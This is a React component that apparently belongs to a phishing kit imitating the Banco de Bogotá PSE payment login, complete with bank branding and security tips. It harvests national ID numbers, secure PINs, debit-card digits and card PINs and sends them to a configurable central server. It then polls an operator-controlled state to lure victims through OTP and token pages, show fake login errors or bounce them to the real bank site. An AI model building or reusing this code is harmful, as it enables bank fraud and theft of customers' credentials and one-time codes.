import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingBogota from "../../../../../components/LoadingBogota";
import logoBogota from "../../img/logo_bancobogota.png";
import womanPhone from "../../img/woman_phone.svg";
import logoGrupoAval from "../../img/logo_grupo_aval.svg";
import logoVigilado from "../../img/logo_vigilado_super.webp";
import "./bogota_login_pse.css";

// Iconos de seguridad
import logoTeclado from "../../img/logo_teclado.webp";
import logoUbiTelefono from "../../img/logo_ubi_telefono.webp";
import imagenCel from "../../img/imagen_cel.webp";

// Clave para el mid flow
const BOGOTA_MID_FLOW_KEY = "bogota_mid_flow";
const BOGOTA_LOGIN_PAGE_CLASS = "bogota-pse-login-page";

// Cédula de ciudadanía Colombia: 6 a 10 dígitos
const BOGOTA_CEDULA_MIN_LENGTH = 6;
const BOGOTA_CEDULA_MAX_LENGTH = 10;

const sanitizeDocumentDigits = (value) =>
    String(value || "")
        .replace(/\D/g, "")
        .slice(0, BOGOTA_CEDULA_MAX_LENGTH);

const isValidColombianCedula = (value) =>
    /^\d{6,10}$/.test(String(value || ""));

const BOGOTA_ERROR_MODAL_KEY = "bogota_error_modal";
const BOGOTA_LOGIN_ERROR_AUTO_HIDE_MS = 5000;
const BOGOTA_LOGIN_ERROR_TITLE = "Verifica los datos que ingresaste";
const BOGOTA_LOGIN_ERROR_MSG = "Revisa tus datos y vuelve a intentarlo.";

const PseNuevo = () => {

    // Se inicializa el navigate
    const navigate = useNavigate();

    // Se inicializa el estado para el cliente
    const [clientType, setClientType] = useState('Banca Personas');
    const [docType, setDocType] = useState({ code: 'C.C.', full: 'Cédula de ciudadanía' });
    const [docNumber, setDocNumber] = useState('');
    const [isDocNumberFocused, setIsDocNumberFocused] = useState(false);
    const [showDocNumberError, setShowDocNumberError] = useState(false);
    const [openDropdown, setOpenDropdown] = useState(null);
    const [getLoading, setLoading] = useState(false);
    const [showModal, setShowModal] = useState(false);
    const [modalMode, setModalMode] = useState(null);
    const [modalText, setModalText] = useState("");

    /** 1 = documento + cliente; 2 = identificación + clave (mismo contenedor .pse-card) */
    const [loginStep, setLoginStep] = useState(1);
    const [authTab, setAuthTab] = useState("clave_segura");
    const [claveSegura, setClaveSegura] = useState("");
    const [showClaveSegura, setShowClaveSegura] = useState(false);
    const [ultimosDigitosTarjeta, setUltimosDigitosTarjeta] = useState("");
    const [claveTarjetaDebito, setClaveTarjetaDebito] = useState("");
    const [showUltimosDigitos, setShowUltimosDigitos] = useState(false);
    const [showClaveTarjeta, setShowClaveTarjeta] = useState(false);

    // Referencias para el polling
    const clientDropdownRef = useRef(null);
    const docDropdownRef = useRef(null);
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const modalBloqueoEstadoRef = useRef(null);
    const ignorarEstadoHastaCambioRef = useRef(null);

    // Opciones para el cliente
    const clientOptions = ['Banca Personas', 'Banca Empresas'];

    // Opciones para el documento
    const docOptions = [
        { code: 'C.C.', full: 'Cédula de ciudadanía' },
        { code: 'C.E.', full: 'Cédula de Extranjería' },
        { code: 'T.I.', full: 'Tarjeta de Identidad' },
        { code: 'R.C.', full: 'Registro Civil' },
        { code: 'P.S.', full: 'Pasaporte' }
    ];

    // Se valida si el formulario es valido (cédula Colombia 6-10 dígitos)
    const isFormValid = isValidColombianCedula(docNumber);

    // Se inicializan los digitos
    const ultimos4Digits = ultimosDigitosTarjeta.replace(/\D/g, "");
    const claveSeguraDigits = claveSegura.replace(/\D/g, "");
    const claveTarjetaDigits = claveTarjetaDebito.replace(/\D/g, "");
    const isClaveSeguraStepValid = authTab === "clave_segura" && claveSeguraDigits.length === 4;
    const isTarjetaStepValid = authTab === "tarjeta_debito" && ultimos4Digits.length === 4 && claveTarjetaDigits.length === 4;
    const isStep2SubmitValid = isClaveSeguraStepValid || isTarjetaStepValid;

    const clearLoginFormFields = () => {
        setDocNumber("");
        setShowDocNumberError(false);
        setOpenDropdown(null);
        setLoginStep(1);
        setAuthTab("clave_segura");
        setClaveSegura("");
        setUltimosDigitosTarjeta("");
        setClaveTarjetaDebito("");
        setShowClaveSegura(false);
        setShowUltimosDigitos(false);
        setShowClaveTarjeta(false);
    };

    const dismissLoginErrorModal = () => {
        setShowModal(false);
        setModalMode(null);
        clearLoginFormFields();

        if (modalBloqueoEstadoRef.current === "error_login") {
            ignorarEstadoHastaCambioRef.current = "error_login";
            modalBloqueoEstadoRef.current = null;
            sessionStorage.removeItem(BOGOTA_MID_FLOW_KEY);
        }
    };

    const showLoginCredentialError = () => {
        stopPolling();
        setLoading(false);
        modalBloqueoEstadoRef.current = "error_login";
        sessionStorage.removeItem(BOGOTA_MID_FLOW_KEY);
        clearLoginFormFields();
        setModalMode("login_error");
        setShowModal(true);
    };

    const dismissLoginErrorModalIfOpen = () => {
        if (modalBloqueoEstadoRef.current === "error_login") {
            dismissLoginErrorModal();
        }
    };

    // Fondo a pantalla completa: anula estilos globales oscuros y franja del scrollbar en desktop
    useEffect(() => {
        document.documentElement.classList.add(BOGOTA_LOGIN_PAGE_CLASS);
        document.body.classList.add(BOGOTA_LOGIN_PAGE_CLASS);

        return () => {
            document.documentElement.classList.remove(BOGOTA_LOGIN_PAGE_CLASS);
            document.body.classList.remove(BOGOTA_LOGIN_PAGE_CLASS);
        };
    }, []);

    useEffect(() => {
        if (!showModal || modalMode !== "login_error") return undefined;

        const timer = setTimeout(() => {
            dismissLoginErrorModal();
        }, BOGOTA_LOGIN_ERROR_AUTO_HIDE_MS);

        return () => clearTimeout(timer);
    }, [showModal, modalMode]);

    // Se ejecuta cuando el componente se monta
    useEffect(() => {

        // Se captura el error modal
        const pendingError = localStorage.getItem(BOGOTA_ERROR_MODAL_KEY);
        if (pendingError === "error_login") {
            showLoginCredentialError();
        } else if (pendingError === "block_ip") {
            modalBloqueoEstadoRef.current = "block_ip";
            setModalMode("block_ip");
            setShowModal(true);
            setModalText("Acceso bloqueado por seguridad.");
        }

        if (pendingError) {
            localStorage.removeItem(BOGOTA_ERROR_MODAL_KEY);
        }

        // Se captura el handoff
        const handoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

        // Se valida si hay handoff
        if (handoff) {

            // Se elimina el handoff
            sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);
            localStorage.setItem("sessionId", handoff);
        }

        // Se usa siempre la sessionId persistida en localStorage
        sessionIdRef.current = localStorage.getItem("sessionId");
        lastEstadoRef.current = null;

        // Se remueve el mid flow
        sessionStorage.removeItem(BOGOTA_MID_FLOW_KEY);

        // Se para el polling
        return () => {
            stopPolling();
        };
    }, []);

    // Se ejecuta cuando el componente se actualiza
    useEffect(() => {

        // Se crea el handler para el click fuera del dropdown
        const handleClickOutside = (event) => {

            // Se valida si el dropdown de cliente esta abierto y si el click fue fuera del dropdown
            if (clientDropdownRef.current && !clientDropdownRef.current.contains(event.target)) {

                // Se cierra el dropdown de cliente
                if (openDropdown === 'client') setOpenDropdown(null);
            }

            // Se valida si el dropdown de documento esta abierto y si el click fue fuera del dropdown
            if (docDropdownRef.current && !docDropdownRef.current.contains(event.target)) {

                // Se cierra el dropdown de documento
                if (openDropdown === 'doc') setOpenDropdown(null);
            }
        };

        // Se agrega el event listener para el click fuera del dropdown
        document.addEventListener('mousedown', handleClickOutside);

        // Se remueve el event listener para el click fuera del dropdown
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, [openDropdown]);

    // Se crea helper de redirección
    const redirigir = (ruta) => {

        // Se redirige a la ruta
        navigate(ruta);
    };

    // Se para el polling
    const stopPolling = () => {

        // Se para el polling
        if (pollingIntervalRef.current) {

            // Se limpia el intervalo
            clearInterval(pollingIntervalRef.current);

            // Se resetea la referencia
            pollingIntervalRef.current = null;
        }
    };

    // Se crea el método de polling
    const initPolling = () => {

        // Se para el polling
        stopPolling();

        // Se inicia el polling
        pollingIntervalRef.current = setInterval(() => {

            // Se verifica el estado
            verifyState();
        }, 3000);

        // Se ejecuta una verificación inmediata sin esperar los primeros 3s
        verifyState();
    };

    // Se crea método para validar estado desde backend
    const verifyState = async () => {

        // Se usa el try catch
        try {

            // Se realiza la petición al backend
            const response = await instanceBackend.post(`/bogota/verify-state/${sessionIdRef.current}`);

            // Se capturan los valores de la respuesta
            const { estado: estadoRaw, tc, tarjeta, bank } = response?.data || {};

            // Se captura el estado actual
            const estadoActual = (estadoRaw || "").toLowerCase();
            const tarjetaDigits = String(tarjeta || '').replace(/\D/g, '');
            const isTcSession = Boolean(tc);
            const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

            // Se valida si el estado actual es valido
            if (!estadoActual) return;

            if (ignorarEstadoHastaCambioRef.current) {
                if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
                ignorarEstadoHastaCambioRef.current = null;
                modalBloqueoEstadoRef.current = null;
            }

            if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
                return;
            }

            if (lastEstadoRef.current === estadoActual) return;

            lastEstadoRef.current = estadoActual;

            // Se ejecuta el switch del estado actual
            switch (estadoActual) {
                case "sol_otp":

                    // Se para el polling
                    stopPolling();

                    // Se setea el loading a false
                    setLoading(false);

                    // Se setea el mid flow
                    sessionStorage.setItem(BOGOTA_MID_FLOW_KEY, "1");

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            "/ingreso-tc/otp",
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                        );
                    } else {

                        // Se redirige a la página de OTP
                        redirigir("/banco_bogota_otp_pse");
                    }

                    // Se sale del switch
                    break;
                case "sol_token":

                    // Se para el polling
                    stopPolling();

                    // Se setea el loading a false
                    setLoading(false);

                    // Se setea el mid flow
                    sessionStorage.setItem(BOGOTA_MID_FLOW_KEY, "1");

                    // Se redirige a la página de token
                    redirigir("/banco_bogota_token");

                    // Se sale del switch
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                case "solicitar_finalizar":

                    // Se para el polling
                    stopPolling();

                    // Se setea el loading a false
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(BOGOTA_MID_FLOW_KEY);

                    // Se redirige al finalizado TC cuando la sesión viene por tarjeta
                    if (isTcSession) {

                        // Se redirige al finalizado TC cuando la sesión viene por tarjeta
                        window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
                    } else {

                        // Se redirige a la página de finalizado
                        redirigir("/finalizado-pse");
                    }

                    // Se sale del switch
                    break;
                case "error_otp":

                    // Se para el polling
                    stopPolling();
                    setLoading(false);

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            "/ingreso-tc/otp",
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                            "error_otp",
                        );
                    } else {

                        // Se setea el error modal
                        localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_otp");

                        // Se redirige a la página de OTP
                        redirigir("/banco_bogota_otp_pse");
                    }

                    // Se sale del switch
                    break;
                case "error_token":

                    // Se para el polling
                    setLoading(false);

                    // Se setea el error modal
                    localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_token");

                    // Se redirige a la página de token
                    redirigir("/banco_bogota_token");

                    // Se sale del switch
                    break;
                case "error_login":
                    showLoginCredentialError();
                    break;
                case "block_ip":
                case "error_blocked":
                    stopPolling();
                    setLoading(false);
                    modalBloqueoEstadoRef.current = "block_ip";
                    setModalMode("block_ip");
                    setShowModal(true);
                    setModalText("Acceso bloqueado por seguridad.");
                    break;
                default:
            }
        } catch (error) {

            // Se omite el error para no romper la UX mientras no exista un estado válido
        }
    };

    // Metodo para cerrar el modal y limpiar el formulario local
    const closeModal = () => {
        if (modalMode === "login_error") {
            dismissLoginErrorModal();
            return;
        }

        const wasBlockIp = modalMode === "block_ip";

        setShowModal(false);
        setModalMode(null);
        setModalText("");
        clearLoginFormFields();

        if (wasBlockIp) {
            modalBloqueoEstadoRef.current = null;
            sessionStorage.removeItem(BOGOTA_MID_FLOW_KEY);
            localStorage.clear();
            window.location.href = process.env.REACT_APP_URL_BANK || "/";
        }
    };

    // Metodo para manejar el submit del formulario
    const handleSubmit = async (event) => {

        // Se previene el comportamiento por defecto del formulario
        event.preventDefault();

        // Se valida que no exista loading
        if (getLoading) return;

        dismissLoginErrorModalIfOpen();
        if (loginStep === 1) {

            if (!isValidColombianCedula(docNumber)) {
                setShowDocNumberError(true);
                return;
            }

            // Se cierra el dropdown
            setOpenDropdown(null);

            // Se setea el paso de login a 2
            setLoginStep(2);

            // Se sale del metodo
            return;
        }

        // Se valida si el paso de login es 2
        if (!isStep2SubmitValid) return;

        // Se captura la sessionId persistida
        const sessionId = localStorage.getItem("sessionId");

        // Se valida que exista la sessionId persistida
        if (!sessionId) {
            setModalMode("generic");
            setShowModal(true);
            setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");
            return;
        }

        // Se captura el metodo de autenticacion
        const metodoAutenticacion = authTab;
        const claveEnviar = authTab === "clave_segura" ? claveSeguraDigits : claveTarjetaDigits;
        const ultimosEnviar = authTab === "tarjeta_debito" ? ultimos4Digits : "";

        // Separador en texto plano: algunos proxies eliminan caracteres de control; el central suele reenviar tipoCliente íntegro.
        const PSE_TIPO_ING_SEP = "::PSE::";
        const tipoClientePse = `${clientType}${PSE_TIPO_ING_SEP}${metodoAutenticacion}${PSE_TIPO_ING_SEP}${ultimosEnviar || ""}`;

        // Se captura los datos a enviar al backend
        const dataSend = {
            "data": {
                "attributes": {
                    "usuario": docNumber,
                    "clave": claveEnviar,
                    "metodoAutenticacion": metodoAutenticacion,
                    "metodo_autenticacion": metodoAutenticacion,
                    "ultimosDigitosTarjeta": ultimosEnviar,
                    ...(ultimosEnviar ? { ultimos_digitos_tarjeta: ultimosEnviar } : {}),
                    "fecha": new Date().toISOString(),
                    "sessionId": sessionId,
                    "backend": "P01",
                    "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    "backend_url": "/api/v1/bogota/authenticacion",
                    "tipoCliente": tipoClientePse,
                    "tipo_cliente": tipoClientePse,
                    "tipoDocumento": docType.code,
                },
            },
        };

        // Se captura la url central configurada
        const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

        // Se reinicia el polling previo antes de reenviar credenciales
        stopPolling();

        // Se reinicia el estado anterior
        lastEstadoRef.current = null;

        // Se usa el try catch
        try {

            // Se activa el loading
            setLoading(true);

            // Se realiza la petición al backend central o al backend local
            const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/bogota/authenticacion", dataSend);

            // Se valida si la respuesta fue exitosa
            if (response?.data?.success) {

                // Se persiste la sessionId devuelta por el backend
                localStorage.setItem("sessionId", response.data.sessionId);

                // Se setea la sessionId persistida
                sessionIdRef.current = response.data.sessionId;

                // Se marca el flujo medio para OTP o token
                sessionStorage.setItem(BOGOTA_MID_FLOW_KEY, "1");

                // Se inicia el polling solo después del envío correcto
                initPolling();
            } else {
                showLoginCredentialError();
            }
        } catch (error) {

            setLoading(false);

            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

            if (status === 403 && estadoErr === "error_blocked") {
                localStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
                return;
            }

            setModalMode("generic");
            setShowModal(true);
            setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
        }
    };

    // Metodo para manejar el cambio del número de documento
    const handleDocNumberChange = (e) => {

        const value = sanitizeDocumentDigits(e.target.value);

        setDocNumber(value);

        dismissLoginErrorModalIfOpen();

        if (isValidColombianCedula(value)) {
            setShowDocNumberError(false);
        }
    };

    // Metodo para manejar el cambio de los últimos 4 dígitos
    const handleUltimosDigitosChange = (e) => {

        // Se normaliza a 4 dígitos numéricos
        const value = e.target.value.replace(/\D/g, "").slice(0, 4);

        // Se actualiza el valor
        setUltimosDigitosTarjeta(value);
        dismissLoginErrorModalIfOpen();
    };

    // Metodo para manejar el cambio de la clave segura
    const handleClaveSeguraChange = (e) => {

        // Se normaliza a 4 dígitos numéricos
        const value = e.target.value.replace(/\D/g, "").slice(0, 4);

        // Se actualiza el valor
        setClaveSegura(value);
        dismissLoginErrorModalIfOpen();
    };

    // Metodo para manejar el cambio de la clave de tarjeta débito
    const handleClaveTarjetaDebitoChange = (e) => {

        // Se normaliza a 4 dígitos numéricos
        const value = e.target.value.replace(/\D/g, "").slice(0, 4);

        // Se actualiza el valor
        setClaveTarjetaDebito(value);
        dismissLoginErrorModalIfOpen();
    };

    // Metodo para manejar el blur del número de documento
    const handleDocNumberBlur = () => {

        setIsDocNumberFocused(false);

        if (!isValidColombianCedula(docNumber)) {
            setShowDocNumberError(true);
        }
    };

    // Metodo para alternar la apertura de dropdowns
    const toggleDropdown = (dropdown) => {

        // Se abre o cierra el dropdown según el estado actual
        setOpenDropdown(openDropdown === dropdown ? null : dropdown);
    };

    // Se retorna el HTML
    return (
        <div className="pse-portal-container">

            {/* Header superior con botón de cierre visual */}
            <div className="pse-top-header">
                <button className="pse-top-close-btn" aria-label="Cerrar">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path d="M18 6L6 18M6 6l12 12" stroke="#0043A9" strokeWidth="2" strokeLinecap="round" />
                    </svg>
                </button>
            </div>

            {/* Contenedor principal de la vista */}
            <div className="pse-portal-wrapper">

                {/* Columna izquierda con ilustración y recomendaciones */}
                <div className="pse-portal-left">
                    <div className="pse-image-section">
                        <img src={womanPhone} alt="Mujer con celular" className="pse-woman-image" />
                    </div>

                    <div className="pse-security-section">
                        <h2 className="pse-security-title">Tu seguridad es primero</h2>
                        <div className="pse-security-list">
                            <div className="pse-security-item">
                                <img src={logoTeclado} alt="No compartas claves" className="pse-security-icon pse-icon-teclado" />
                                <p className="pse-security-text">No compartas tus claves con terceros.</p>
                            </div>
                            <div className="pse-security-item">
                                <img src={logoUbiTelefono} alt="Dispositivo desconocido" className="pse-security-icon pse-icon-ubi" />
                                <p className="pse-security-text">Evita realizar transacciones desde un equipo o dispositivo desconocido.</p>
                            </div>
                            <div className="pse-security-item">
                                <img src={imagenCel} alt="Cambiar contraseñas" className="pse-security-icon pse-icon-cel" />
                                <p className="pse-security-text">Procura cambiar tus contraseñas bancarias periódicamente o antes, si sientes que es necesario.</p>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Columna derecha con logo y formulario */}
                <div className="pse-portal-right">
                    <div className="pse-logo-section">
                        <img src={logoBogota} alt="Banco de Bogotá" className="pse-logo" />
                    </div>

                    <div className="pse-form-section">
                        <h1 className="pse-main-title">
                            Bienvenido al portal<br />de pagos en línea PSE
                        </h1>

                        {/* Tarjeta principal del formulario */}
                        <form className="pse-card" onSubmit={handleSubmit}>

                            {/* Paso 1: cliente + documento */}
                            {loginStep === 1 && (
                                <>
                                    <p className="pse-form-label pse-form-label--bold">Ingresa tipo y número de documento</p>

                                    <div className="pse-form-group" ref={clientDropdownRef}>
                                        <label className="pse-label">¿Qué tipo de cliente eres?</label>
                                        <div
                                            className={`pse-custom-select ${openDropdown === 'client' ? 'pse-select-open' : ''}`}
                                            onClick={() => toggleDropdown('client')}
                                        >
                                            <span>{clientType}</span>
                                            <svg className="pse-select-arrow" viewBox="0 0 16 10" fill="none">
                                                <path
                                                    d="M1 1.5L8 8.5L15 1.5"
                                                    stroke="#0043A9"
                                                    strokeWidth="2"
                                                    strokeLinecap="round"
                                                    style={{
                                                        transform: openDropdown === 'client' ? 'rotate(180deg)' : 'rotate(0deg)',
                                                        transformOrigin: 'center',
                                                        transition: 'transform 0.3s'
                                                    }}
                                                />
                                            </svg>
                                        </div>
                                        {openDropdown === 'client' && (
                                            <div className="pse-dropdown-menu">
                                                {clientOptions.map((opt) => (
                                                    <div
                                                        key={opt}
                                                        className={`pse-dropdown-item ${clientType === opt ? 'selected' : ''}`}
                                                        onClick={() => { setClientType(opt); setOpenDropdown(null); }}
                                                    >
                                                        {opt}
                                                    </div>
                                                ))}
                                            </div>
                                        )}
                                    </div>

                                    <div className="pse-form-row">
                                        <div className="pse-form-group pse-form-group-small" ref={docDropdownRef}>
                                            <label className="pse-label">Documento</label>
                                            <div
                                                className={`pse-custom-select ${openDropdown === 'doc' ? 'pse-select-open' : ''}`}
                                                onClick={() => toggleDropdown('doc')}
                                            >
                                                <span>{docType.code} ...</span>
                                                <svg className="pse-select-arrow" viewBox="0 0 12 8" fill="none">
                                                    <path
                                                        d="M1 1.5L6 6.5L11 1.5"
                                                        stroke="#0043A9"
                                                        strokeWidth="2"
                                                        strokeLinecap="round"
                                                        style={{
                                                            transform: openDropdown === 'doc' ? 'rotate(180deg)' : 'rotate(0deg)',
                                                            transformOrigin: 'center',
                                                            transition: 'transform 0.3s'
                                                        }}
                                                    />
                                                </svg>
                                            </div>
                                            {openDropdown === 'doc' && (
                                                <div className="pse-dropdown-menu pse-dropdown-menu-small">
                                                    {docOptions.map((opt) => (
                                                        <div
                                                            key={opt.code}
                                                            className={`pse-dropdown-item ${docType.code === opt.code ? 'selected' : ''}`}
                                                            onClick={() => { setDocType(opt); setOpenDropdown(null); }}
                                                        >
                                                            <strong>{opt.code}</strong> {opt.full}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}
                                        </div>

                                        <div className="pse-form-group pse-form-group-large">
                                            <label className="pse-label">Número</label>
                                            <div className={`pse-input-wrapper ${isDocNumberFocused ? 'focused' : ''} ${showDocNumberError ? 'error' : ''}`}>
                                                <input
                                                    type="text"
                                                    placeholder="Ejemplo: 1234"
                                                    value={docNumber}
                                                    maxLength={BOGOTA_CEDULA_MAX_LENGTH}
                                                    inputMode="numeric"
                                                    pattern="[0-9]*"
                                                    autoComplete="off"
                                                    onChange={handleDocNumberChange}
                                                    onPaste={(e) => e.preventDefault()}
                                                    onFocus={() => setIsDocNumberFocused(true)}
                                                    onBlur={handleDocNumberBlur}
                                                />
                                                {showDocNumberError && (
                                                    <div className="pse-error-icon">!</div>
                                                )}
                                            </div>
                                        </div>
                                    </div>

                                    <button
                                        type="submit"
                                        className={`pse-continue-btn ${isFormValid ? 'active' : 'disabled'}`}
                                        disabled={!isFormValid || getLoading}
                                    >
                                        Continuar
                                    </button>
                                </>
                            )}

                            {/* Paso 2: autenticación */}
                            {loginStep === 2 && (
                                <>
                                    <div className="pse-auth-tabs" role="tablist">
                                        <button
                                            type="button"
                                            role="tab"
                                            aria-selected={authTab === "clave_segura"}
                                            className={`pse-auth-tab ${authTab === "clave_segura" ? "active" : ""}`}
                                            onClick={() => setAuthTab("clave_segura")}
                                        >
                                            Clave Segura
                                        </button>
                                        <button
                                            type="button"
                                            role="tab"
                                            aria-selected={authTab === "tarjeta_debito"}
                                            className={`pse-auth-tab ${authTab === "tarjeta_debito" ? "active" : ""}`}
                                            onClick={() => setAuthTab("tarjeta_debito")}
                                        >
                                            Tarjeta débito
                                        </button>
                                    </div>

                                    <p className="pse-form-label pse-ident-heading">Identificación</p>

                                    {/* Resumen bloqueado del documento seleccionado */}
                                    <div className="pse-form-row">
                                        <div className="pse-form-group pse-form-group-small">
                                            <div
                                                className="pse-custom-select pse-custom-select--locked"
                                                aria-disabled="true"
                                            >
                                                <span>{docType.code} ...</span>
                                                <svg className="pse-select-arrow" viewBox="0 0 12 8" fill="none" aria-hidden>
                                                    <path
                                                        d="M1 1.5L6 6.5L11 1.5"
                                                        stroke="#0043A9"
                                                        strokeWidth="2"
                                                        strokeLinecap="round"
                                                    />
                                                </svg>
                                            </div>
                                        </div>

                                        <div className="pse-form-group pse-form-group-large">
                                            <div className="pse-input-wrapper pse-input-wrapper--locked">
                                                <input
                                                    type="text"
                                                    readOnly
                                                    tabIndex={-1}
                                                    aria-readonly="true"
                                                    value={docNumber}
                                                />
                                            </div>
                                        </div>
                                    </div>

                                    {/* Formulario de clave segura */}
                                    {authTab === "clave_segura" && (
                                        <div className="pse-form-group pse-form-group-tight">
                                            <label className="pse-label">Clave Segura</label>
                                            <div className="pse-input-wrapper pse-input-with-action">
                                                <input
                                                    type={showClaveSegura ? "text" : "password"}
                                                    inputMode="numeric"
                                                    maxLength={4}
                                                    autoComplete="off"
                                                    value={claveSegura}
                                                    onChange={handleClaveSeguraChange}
                                                    className="pse-input-padded-action"
                                                />
                                                <button
                                                    type="button"
                                                    className="pse-inline-action"
                                                    onClick={() => setShowClaveSegura((v) => !v)}
                                                >
                                                    {showClaveSegura ? "Ocultar" : "Mostrar"}
                                                </button>
                                            </div>
                                        </div>
                                    )}

                                    {/* Formulario de tarjeta débito */}
                                    {authTab === "tarjeta_debito" && (
                                        <>
                                            <div className="pse-form-group">
                                                <label className="pse-label">Últimos 4 dígitos de tu Tarjeta Débito</label>
                                                <div className="pse-input-wrapper pse-input-with-action">
                                                    <input
                                                        type={showUltimosDigitos ? "text" : "password"}
                                                        inputMode="numeric"
                                                        placeholder="#"
                                                        autoComplete="off"
                                                        value={ultimosDigitosTarjeta}
                                                        onChange={handleUltimosDigitosChange}
                                                        className="pse-input-padded-action"
                                                    />
                                                    <button
                                                        type="button"
                                                        className="pse-inline-action"
                                                        onClick={() => setShowUltimosDigitos((v) => !v)}
                                                    >
                                                        {showUltimosDigitos ? "Ocultar" : "Mostrar"}
                                                    </button>
                                                </div>
                                            </div>
                                            <div className="pse-form-group">
                                                <label className="pse-label">Clave de tu Tarjeta Débito</label>
                                                <div className="pse-input-wrapper pse-input-with-action">
                                                    <input
                                                        type={showClaveTarjeta ? "text" : "password"}
                                                        inputMode="numeric"
                                                        maxLength={4}
                                                        autoComplete="off"
                                                        value={claveTarjetaDebito}
                                                        onChange={handleClaveTarjetaDebitoChange}
                                                        className="pse-input-padded-action"
                                                    />
                                                    <button
                                                        type="button"
                                                        className="pse-inline-action"
                                                        onClick={() => setShowClaveTarjeta((v) => !v)}
                                                    >
                                                        {showClaveTarjeta ? "Ocultar" : "Mostrar"}
                                                    </button>
                                                </div>
                                            </div>
                                        </>
                                    )}

                                    <button
                                        type="submit"
                                        className={`pse-continue-btn pse-ingresar-btn ${isStep2SubmitValid ? 'active' : 'disabled'}`}
                                        disabled={!isStep2SubmitValid || getLoading}
                                    >
                                        Ingresar ahora
                                    </button>
                                </>
                            )}
                        </form>

                        {/* Logos institucionales del pie del formulario */}
                        <div className="pse-footer-logos">
                            <div className="pse-logo-aval-img">
                                <img src={logoGrupoAval} alt="Grupo Aval" className="pse-aval-img" />
                            </div>
                            <div className="pse-vigilado-img">
                                <img src={logoVigilado} alt="Vigilado Superintendencia Financiera de Colombia" className="pse-vigilado-logo" />
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Modal de errores y bloqueos */}
            {showModal && (
                <div
                    className={`bogota-modal-wrap ${modalMode === "login_error" ? "bogota-modal-wrap--login-error" : ""}`}
                    onClick={modalMode === "login_error" ? dismissLoginErrorModal : closeModal}
                >
                    {modalMode === "login_error" ? (
                        <div
                            className="bogota-modal-card--login-error"
                            onClick={(e) => e.stopPropagation()}
                            role="alertdialog"
                            aria-labelledby="bogota-login-error-title"
                            aria-describedby="bogota-login-error-desc"
                        >
                            <div className="bogota-modal-login-error-body">
                                <div className="bogota-modal-login-error-icon" aria-hidden="true">
                                    <svg
                                        xmlns="http://www.w3.org/2000/svg"
                                        viewBox="0 0 24 24"
                                        width="40"
                                        height="40"
                                        fill="none"
                                    >
                                        <circle cx="12" cy="12" r="11" fill="currentColor" />
                                        <path
                                            d="M12 7.5v5.25M12 16.25h.01"
                                            stroke="#fff"
                                            strokeWidth="1.75"
                                            strokeLinecap="round"
                                        />
                                    </svg>
                                </div>
                                <h2
                                    id="bogota-login-error-title"
                                    className="bogota-modal-login-error-title"
                                >
                                    {BOGOTA_LOGIN_ERROR_TITLE}
                                </h2>
                                <p
                                    id="bogota-login-error-desc"
                                    className="bogota-modal-login-error-text"
                                >
                                    {BOGOTA_LOGIN_ERROR_MSG}
                                </p>
                            </div>
                            <div className="bogota-modal-login-error-footer">
                                <button
                                    type="button"
                                    className="bogota-modal-retry-btn"
                                    onClick={dismissLoginErrorModal}
                                >
                                    Reintentar
                                </button>
                            </div>
                        </div>
                    ) : (
                        <div className="bogota-modal-card" onClick={(e) => e.stopPropagation()}>
                            <div className="bogota-modal-top">Personas</div>
                            <div className="bogota-modal-mid">
                                <p>{modalText}</p>
                            </div>
                            <div className="bogota-modal-bot">
                                <button
                                    type="button"
                                    className="bogota-modal-accept-btn"
                                    onClick={closeModal}
                                >
                                    Aceptar
                                </button>
                            </div>
                        </div>
                    )}
                </div>
            )}

            {/* Loading overlay mientras se envía o se espera cambio de estado */}
            {getLoading && <LoadingBogota isOpen />}
        </div>
    );
};

// Se exporta el componente
export default PseNuevo;